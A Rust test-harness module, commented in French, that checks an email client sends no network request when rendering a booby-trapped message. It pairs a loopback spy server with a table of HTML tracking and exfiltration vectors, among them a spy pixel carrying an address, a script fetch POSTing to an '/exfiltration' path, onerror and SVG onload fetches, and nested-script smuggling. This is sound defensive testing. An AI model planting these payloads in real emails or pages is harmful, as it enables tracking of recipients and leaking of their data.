//! Les verrous du **critère 8** de `docs/PHASE-1.md` : *zéro requête réseau au rendu d'un mail
//! piégé*.
//!
//! ## Pourquoi ce crate existe, et pourquoi les verrous ont déménagé
//!
//! Le critère se prouve en deux étages, et ils ne prouvent pas la même chose :
//!
//! | Étage | Ce qui est mis à l'épreuve | Où |
//! |---|---|---|
//! | 1 | l'assainisseur — **la ceinture que nous écrivons** | `tests/sanitiser.rs` |
//! | 2 | la CSP — **la barrière appliquée par le moteur** | `src/main.rs` |
//!
//! L'étage 1 vivait dans `crates/mailhtml/tests/no_network.rs`. Il est ici maintenant, pour une
//! raison simple : **les deux étages doivent piéger le même message**. Un vecteur d'attaque
//! ajouté à un fichier et pas à l'autre laisserait un trou dans celui qu'on n'a pas mis à jour,
//! et personne ne le verrait. `mailhtml` ne peut pas héberger l'étage 2 — il n'a pas à
//! dépendre d'un moteur de rendu — donc c'est le message piégé qui déménage, et l'étage 1 le
//! suit.
//!
//! Ce module porte les deux pièces communes : le [`Spy`] et le [`trapped_message`].
//!
//! ## Un zéro qui ne peut pas être autre chose ne prouve rien
//!
//! Un compteur à zéro parce que le serveur est mort dit exactement la même chose qu'un
//! compteur à zéro parce que rien n'a été demandé. Les deux étages portent donc un **contrôle
//! positif** : l'étage 1 fait une requête volontaire et vérifie que le compteur monte ;
//! l'étage 2 rend le message **sans** CSP et vérifie que le moteur va bien chercher les
//! ressources. Sans ces deux contrôles, tout le reste serait un test qui se félicite tout seul.

#![forbid(unsafe_code)]

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

/// Un serveur qui compte ce qu'on lui demande et ne sert rien d'utile.
///
/// Il **répond** quelque chose, et c'est délibéré : ce n'est pas notre refus de servir qui doit
/// empêcher la requête, c'est qu'elle ne soit jamais partie. Un serveur muet laisserait planer
/// le doute d'un client qui aurait renoncé faute de réponse.
#[derive(Debug)]
pub struct Spy {
    /// L'adresse écoutée, sur le bouclage et sur un port libre.
    pub address: SocketAddr,
    requests: Arc<AtomicUsize>,
    /// Les chemins demandés, dans l'ordre. Sert à dire **quoi** a fuité, pas seulement combien.
    paths: Arc<std::sync::Mutex<Vec<String>>>,
}

impl Spy {
    /// Démarre le serveur sur un port libre du bouclage.
    ///
    /// # Panics
    ///
    /// Si aucun port du bouclage n'est disponible. C'est un harnais de vérification : **échouer
    /// fort est le bon comportement**, parce qu'un serveur espion qui n'écoute pas rendrait des
    /// zéros qui ne prouvent rien. `expect_used` est donc levé ici, et seulement ici.
    #[must_use]
    #[allow(clippy::expect_used)]
    pub fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("port libre sur le bouclage");
        let address = listener.local_addr().expect("adresse du port");
        let requests = Arc::new(AtomicUsize::new(0));
        let paths = Arc::new(std::sync::Mutex::new(Vec::new()));

        let counter = Arc::clone(&requests);
        let seen = Arc::clone(&paths);
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(stream) = stream else { continue };
                // **Compté à l'acceptation, avant toute lecture.** Une connexion TCP ouverte
                // vers l'hôte d'un expéditeur est *déjà* une fuite : elle révèle que le message
                // a été ouvert, même si aucune requête HTTP ne suit.
                counter.fetch_add(1, Ordering::SeqCst);

                // **Un fil par connexion, et c'est la correction d'un vrai défaut.** La
                // première version servait les connexions en série : une seule requête laissée
                // en suspens par un client — un `<video>` qui ouvre et attend, un POST dont le
                // corps n'arrive pas — bloquait la boucle d'acceptation pour toute la suite de
                // l'exécution.
                //
                // Ce que ça cassait est instructif : un `load` d'`<iframe>` n'est émis qu'une
                // fois **toutes les sous-ressources** terminées. Serveur bloqué, les
                // sous-ressources d'une phase ultérieure restaient en attente, l'`<iframe>`
                // n'émettait jamais `load`, et la phase ne se posait pas. C'est le contrôle
                // final — la phase D — qui l'a révélé.
                let seen = Arc::clone(&seen);
                std::thread::spawn(move || serve_one(stream, &seen));
            }
        });

        Self {
            address,
            requests,
            paths,
        }
    }

    /// Le nombre de requêtes reçues.
    #[must_use]
    pub fn count(&self) -> usize {
        self.requests.load(Ordering::SeqCst)
    }

    /// Les chemins demandés, dans l'ordre.
    #[must_use]
    pub fn paths(&self) -> Vec<String> {
        self.paths.lock().map(|it| it.clone()).unwrap_or_default()
    }

    /// L'hôte tel qu'il apparaît dans les URL du message piégé.
    #[must_use]
    pub fn host(&self) -> String {
        self.address.to_string()
    }
}

/// Sert une connexion : lit la ligne de requête, note le chemin, répond, raccroche.
///
/// Le délai de lecture est ce qui empêche un client silencieux de retenir un fil pour toujours.
/// Il est court : un client local qui a ouvert une connexion et n'envoie rien en deux secondes
/// n'enverra rien.
fn serve_one(mut stream: std::net::TcpStream, seen: &Arc<std::sync::Mutex<Vec<String>>>) {
    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(2)));

    // Lire la première ligne pour savoir **ce** qui a été demandé. Le compteur dit qu'il y a eu
    // une fuite ; le chemin dit par quel vecteur, ce qui est la différence entre un test qui
    // échoue et un test qui explique.
    let mut buffer = [0u8; 2048];
    let read = stream.read(&mut buffer).unwrap_or(0);
    let request = String::from_utf8_lossy(&buffer[..read]);
    let path = request
        .lines()
        .next()
        .and_then(|line| line.split_whitespace().nth(1))
        .unwrap_or("?")
        .to_owned();
    if let Ok(mut guard) = seen.lock() {
        guard.push(path);
    }

    // `no-store` n'est pas décoratif. Sans lui, un moteur pourrait resservir depuis son cache
    // mémoire une ressource déjà chargée par une phase précédente, et l'absence de requête
    // serait mise au crédit de la CSP alors qu'elle ne viendrait que du cache. Ceinture et
    // bretelles avec les préfixes de chemin par phase.
    //
    // `Connection: close` pour que le client ne garde pas la connexion ouverte : ici on veut
    // compter des requêtes, pas tenir une conversation.
    let _ = stream.write_all(
        b"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nContent-Length: 0\r\n\
          Cache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\n\
          Connection: close\r\n\r\n",
    );
    let _ = stream.flush();
}

/// Les vecteurs du message piégé, **un par un et nommés**.
///
/// ## Pourquoi une table et pas un seul bloc de HTML
///
/// Le premier jet était un unique littéral. Il a suffi tant qu'on comptait « zéro ou pas zéro ».
/// Le jour où l'étage 2 a détecté **une** connexion sortante sous CSP, il a fallu savoir
/// laquelle — et un bloc monolithique ne le dit pas.
///
/// Une table permet trois choses : rendre un seul vecteur pour isoler un coupable
/// (`MAILPRIVACY_ONLY`), nommer ce qui fuit dans un rapport, et ajouter un vecteur sans relire
/// tout le message.
///
/// `{host}` est remplacé par l'hôte du serveur instrumenté.
pub const VECTORS: &[(&str, &str)] = &[
    (
        "meta-refresh",
        r#"<meta http-equiv="refresh" content="0; url=http://{host}/redirection">"#,
    ),
    (
        "feuille-externe",
        r#"<link rel="stylesheet" href="http://{host}/feuille.css">"#,
    ),
    (
        "prefetch",
        r#"<link rel="prefetch" href="http://{host}/prechargement">"#,
    ),
    ("base", r#"<base href="http://{host}/">"#),
    (
        "css-import",
        r#"<style>@import url("http://{host}/import.css");</style>"#,
    ),
    (
        "police-web",
        r#"<style>@font-face { font-family: espion; src: url("http://{host}/police.woff2"); }
           .p { font-family: espion; }</style><p class="p">police</p>"#,
    ),
    (
        "css-fond",
        r#"<style>body { background: url('http://{host}/fond.png'); }</style>"#,
    ),
    (
        "script-externe",
        r#"<script src="http://{host}/script.js"></script>"#,
    ),
    (
        "script-fetch",
        r#"<script>fetch("http://{host}/exfiltration", {method:"POST"})</script>"#,
    ),
    (
        "onload-fetch",
        r#"<div onload="fetch('http://{host}/onload')"></div>
           <img src="data:," onerror="fetch('http://{host}/onload')">"#,
    ),
    (
        "pixel-espion",
        r#"<img src="http://{host}/pixel.gif?email=marie%40exemple.fr" width="1" height="1" alt="">"#,
    ),
    (
        "pixel-cache",
        r#"<img src="http://{host}/pixel2.gif" width="600" style="display:none">"#,
    ),
    (
        "image-distante",
        r#"<img src="http://{host}/logo.png" width="200" height="60"
             srcset="http://{host}/logo@2x.png 2x" alt="logo">"#,
    ),
    (
        "css-attribut",
        r#"<div style="background-image: url(http://{host}/fond2.png); position: fixed">caché</div>"#,
    ),
    (
        "formulaire",
        r#"<form action="http://{host}/formulaire" method="post">
             <input type="hidden" name="email" value="marie@exemple.fr">
             <button type="submit">Confirmer</button>
           </form>"#,
    ),
    ("iframe", r#"<iframe src="http://{host}/cadre"></iframe>"#),
    ("object", r#"<object data="http://{host}/objet"></object>"#),
    ("embed", r#"<embed src="http://{host}/embarque">"#),
    (
        "video",
        r#"<video poster="http://{host}/affiche.jpg" src="http://{host}/video.mp4"
             preload="auto"></video>"#,
    ),
    (
        "audio",
        r#"<audio src="http://{host}/son.mp3" preload="auto"></audio>"#,
    ),
    // Celui-là a le droit de survivre à l'assainissement : un lien n'est pas chargé.
    ("lien", r#"<a href="http://{host}/lien-clique">le lien</a>"#),
    (
        "contournement-javascript",
        r#"<img src="javascript:fetch('http://{host}/js')">"#,
    ),
    (
        "contournement-svg",
        r#"<img src="data:image/svg+xml,<svg onload=fetch('http://{host}/svg')>">"#,
    ),
    // Racine-relative : elle ignore le chemin de la `<base>`. C'est ce vecteur qui a montré
    // qu'un préfixe de chemin par phase ne suffisait pas à attribuer une requête.
    ("url-relative", r#"<img src="/pixel-relatif.gif">"#),
    (
        "contrebande-script",
        r#"<scr<script>ipt src="http://{host}/imbrique.js"></script>"#,
    ),
];

/// Un message qui essaie tout ce que `docs/PRIVACY.md` énumère.
///
/// Chaque ressource pointe vers le serveur instrumenté : si l'une d'elles partait, le compteur
/// le dirait.
///
/// **Les deux étages du critère 8 partagent cette fonction.** Ajouter un vecteur dans
/// [`VECTORS`] le fait entrer dans les deux d'un coup, ce qui est exactement la raison pour
/// laquelle rien n'est recopié.
#[must_use]
pub fn trapped_message(host: &str) -> String {
    message_from(host, VECTORS)
}

/// Le message construit à partir d'une sélection de vecteurs, tous vers le même hôte.
///
/// Sert à isoler un coupable : une exécution avec un seul vecteur dit si c'est lui qui sort.
#[must_use]
pub fn message_from(host: &str, vectors: &[(&str, &str)]) -> String {
    assemble(vectors, |_| host.to_owned())
}

/// Le message où **chaque vecteur vise son propre hôte**.
///
/// C'est ce qui rend l'attribution exacte dans une seule exécution : une connexion arrivée sur
/// le port du vecteur `iframe` vient du vecteur `iframe`, même si elle ne porte aucune requête
/// HTTP lisible. Sans ça, une connexion nue est un compteur qui monte sans qu'on sache pourquoi
/// — et c'est précisément ce qui est arrivé le 2026-09-03.
#[must_use]
pub fn message_per_host(hosts: &[(&str, String)]) -> String {
    let selected: Vec<(&str, &str)> = VECTORS
        .iter()
        .filter(|(name, _)| hosts.iter().any(|(it, _)| it == name))
        .map(|(name, html)| (*name, *html))
        .collect();
    assemble(&selected, |name| {
        hosts
            .iter()
            .find(|(it, _)| *it == name)
            .map(|(_, host)| host.clone())
            .unwrap_or_default()
    })
}

/// Assemble le document, en demandant l'hôte de chaque vecteur.
fn assemble(vectors: &[(&str, &str)], host_of: impl Fn(&str) -> String) -> String {
    let body: String = vectors
        .iter()
        .map(|(name, html)| {
            format!(
                "\n  <!-- {name} -->\n  {}\n",
                html.replace("{host}", &host_of(name))
            )
        })
        .collect();
    format!(
        "<html>\n<head>\n<title>facture</title>\n</head>\n<body>\n\
         <p>Bonjour, voici votre facture.</p>\n{body}</body>\n</html>\n"
    )
}

/// Le vecteur nommé, s'il existe.
#[must_use]
pub fn vector(name: &str) -> Option<&'static (&'static str, &'static str)> {
    VECTORS.iter().find(|(it, _)| *it == name)
}
